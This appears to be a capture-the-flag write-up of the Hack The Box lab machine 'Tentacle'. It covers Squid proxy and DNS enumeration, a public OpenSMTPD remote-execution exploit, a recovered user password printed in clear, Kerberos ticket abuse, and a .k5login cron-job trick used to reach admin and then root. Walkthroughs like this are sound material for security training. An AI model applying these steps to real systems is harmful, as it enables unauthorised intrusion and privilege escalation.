---
permalink: /tentacle
layout: post
author: polarbearer
title: Tentacle
date: 2021-06-19
publish: True

description: "Tentacle is a Hard linux machine featuring a Squid proxy server bypassing. Revealed host is vulnerable to OpenSMTPD service. Exploiting SMTPD service will allow us as a root user at smtp running as podman. On exploring we will get a valid credentials for making valid Kerberos ticket. This ticket then can be used to move laterally. Finally a cronjob can be exploited to escalate to another user who has privileges to add root user to Kerberos principals. This gives us a root shell."
---

# Skills Learned

- DNS Enumeration
- Squid Proxy Enumeration
- OpenSMTPD Exploitation
- Kerberos


# Enumeration

## Nmap

* 22
* 53
* 88
* 3128
* 9090

```bash
PORT     STATE  SERVICE      VERSION  
22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)  
| ssh-hostkey:    
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)  
|\_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)  
53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)  
88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-06-19 15:14:22Z)  
3128/tcp open   http-proxy   Squid http proxy 4.11  
|\_http-server-header: squid/4.11  
|\_http-title: ERROR: The requested URL could not be retrieved  
9090/tcp closed zeus-admin  
Aggressive OS guesses: Linux 5.1 (94%), Linux 3.10 - 4.11 (92%), HP P2000 G3 NAS device (91%), Linux 3.2 - 4.9 (91%), Linux 3.16 - 4.6 (90%), Linux 2.6.32 (90%), Linu  
x 2.6.32 - 3.1 (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Linux 5.0 (90%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 2 hops  
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise\_linux:8  
  
TRACEROUTE (using port 9090/tcp)  
HOP RTT       ADDRESS  
1   365.57 ms 10.10.14.1  
2   361.85 ms srv01.realcorp.htb (10.10.10.224)  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 148.42 seconds
```


### Port 3128

![](/Writeups/Tentacle/Pasted image 20210619205338.png)

|User Name|Domain|
|---|---|
|j.nakazawa | realcorp.htb|

Adding Domain name to our host file. 

![](/Writeups/Tentacle/Pasted image 20210619205729.png)

Using gobuster to find subdomains

![](/Writeups/Tentacle/Pasted image 20210619213033.png)

nslookup to find ipaddress of the subdomains

![](/Writeups/Tentacle/Pasted image 20210619212939.png)

|sub-domain| address|
|---|---|
|proxy.realcorp.htb|10.197.243.77|
|wpad.realcorp.htb| 10.197.243.31|

# WPAD

The Web Proxy Auto-Discovery Protocol is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL.

Trying to connect to 10.197.243.31 using proxy in curl

`curl --proxy http://10.10.10.224:3128 http://10.197.243.31`

we got a `access denied` and found another subdomain `srv01.realcorp.htb`

![](/Writeups/Tentacle/Pasted image 20210619214009.png)

We can try to connect using proxychains and scan the address 

```bash

http 10.10.10.224 3128  
http 127.0.0.1 3128  
http 10.197.243.77 3128

```

Add these to `/etc/proxychains.config` file and host file

![](/Writeups/Tentacle/Pasted image 20210619220114.png)

![](/Writeups/Tentacle/Pasted image 20210619221337.png)

```bash
proxychains nmap -sT -Pn -oN proxy 10.197.243.31  
...[snip]...  
PORT    STATE SERVICE  
22/tcp  open  ssh  
53/tcp  open  domain  
80/tcp  open  http  
88/tcp  open  kerberos-sec  
464/tcp  open  kpasswd5  
749/tcp  open  kerberos-adm  
3128/tcp open  squid-http
```

Lets try to download the PAC file from this host.

![](/Writeups/Tentacle/Pasted image 20210619221448.png)

From the PAC file, we can find that the domain realcorp.htb , along with the subnet ranges 10.197.243.0/24 and 10.241.251.0/24 are configured for direct access.Other destination is set to pass through the proxy server.

we can use dnsrecon to find out domain from range

```bash
dnsrecon -d realcorb.htb -n 10.10.10.224 -r 10.197.243.0/24  
[*] Reverse Look-up of a Range  
[*] Performing Reverse Lookup from 10.197.243.0 to 10.197.243.255  
[+] PTR wpad.realcorp.htb 10.197.243.31  
[+] PTR ns.realcorp.htb 10.197.243.77  
[+] 2 Records Found
```

Simillarly we can find out subdomains in the range `10.241.251.0/24`

![](/Writeups/Tentacle/Pasted image 20210619223611.png)

`srvpod01.realcorp.htb 10.241.251.113`

A new host `srvpod01` was found. We continue our enumeration by performing a portscan on this host.

```bash

proxychains nmap -sT -sV -Pn 10.241.251.113  
...[snip]...  
Nmap scan report for 10.241.251.113  
Host is up (1.1s latency).  
  
PORT   STATE SERVICE VERSION  
25 tcp open  smtp    OpenSMTPD  
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP,    
| _ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info    
Service Info: Host: smtp.realcorp.htb 
...[snip]...

```

 The smtp port is open and OpenSMTPD service is running on this port.OpenSMTPD 6.6 allows remote command execution (RCE). We can modify the exploit and add j.nakazawa@realcorp.htb as a valid email in the recipient address to get code execution.
 
 ![](/Writeups/Tentacle/Pasted image 20210619225708.png)
 
 we can mirror the exploit and change the email to valid one.
 
 ![](/Writeups/Tentacle/Pasted image 20210619230404.png)
 
 Got a hit as root  user at smtp
 
 ![](/Writeups/Tentacle/Pasted image 20210619232314.png)
 
 we got the creds of the user j.nakazawa
 
 ![](/Writeups/Tentacle/Pasted image 20210619234052.png)
 
 |user|password|
 |---|---|
 |j.nakazawa| sJB}RM>6Z~64_|
 
 We try to connect to SSH using the credentials: `j.nakazawa / sJB}RM>6Z~64_` attempt failed. As Kerberos is  running on the server, these credentials can be used to generate a Kerberos ticket which can then be used to authenticate to the SSH service. We configure the file /etc/krb5.conf as below in our local  machine.
 
 ```bash
 [libdefaults]
	default_realm = REALCORP.HTB


[realms]
		<SNIP>
		...
        REALCORP.HTB = {
                kdc = 10.10.10.224
        }

[domain_realm]
	<SNIP>
	...
	srv01.realcorp.htb = REALCORP.HTB
```

In `krb5.config` file we made default_relam to `REALCORP.HTB` , added realms and domain_realm as shown above to create Kerberos ticket then using that ticket to authenticate with SSH. 

add `srv01.realcorp.htb` to our host file and  make sure our local time is synchronized with the time of the KDC, we run ntpdate .

![](/Writeups/Tentacle/Pasted image 20210620082430.png)

`ntpdate 10.10.10.224`

We can initialize the kerberos using `kinit` with username , then it prompts for password.


```bash
┌[Parrot]─[08:14-20/06]─[/home/aju]
└╼aju$kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: sJB}RM>6Z~64_
```

` klist` command shows created ticket using this ticket we can ssh into machine.

![](/Writeups/Tentacle/Pasted image 20210620082808.png)

![](/Writeups/Tentacle/Pasted image 20210620082622.png)

# Privilege Escaltion

On exploring more on the system found an interseting `cron` 

![](/Writeups/Tentacle/Pasted image 20210620083521.png)

![](/Writeups/Tentacle/Pasted image 20210620083827.png)

This script copies all files from /var/log/squid to /home/admin folder and it removes log files from the /home/admin folder. User `j.nakazawa` has  write permission to the squid folder, thus it gives us ability to write into admin's home.

Let's create a .k5login file content as `j.nakazawa@REALCORP.HTB` at squid folder.

`echo "j.nakazawa@REALCORP.HTB" > /var/log/squid/.k5login`

As per Kerberos documentation, `.k5login` files can be used to grant other users access to an account without the need of a password using this advantage we can privilege our user to admin.

Wait for few minutes to copy files, then we can ssh as admin to the box.

![](/Writeups/Tentacle/Pasted image 20210620084709.png)

On checking the files owned by the group admin we can see `krb5.keytab`

![](/Writeups/Tentacle/Pasted image 20210620085853.png)

The purpose of the **Keytab** file is to allow the user to access distinct **Kerberos** Services without being prompted for a password at each Service. Furthermore, it allows scripts and daemons to login to **Kerberos** Services without the need to store clear-text passwords or for human intervention.

We list the principals in the keytab file.

`klist -kt /etc/krb5.keytab`

![](/Writeups/Tentacle/Pasted image 20210620090544.png)

Let's add root's principle into it with a new password

![](/Writeups/Tentacle/Pasted image 20210620091808.png)

Sucessfully created new principle for the root and we can login as root in the box using command `ksu` then it prompts for password enter the password used to create.

![](/Writeups/Tentacle/Pasted image 20210620092319.png)

[Back](/writeup)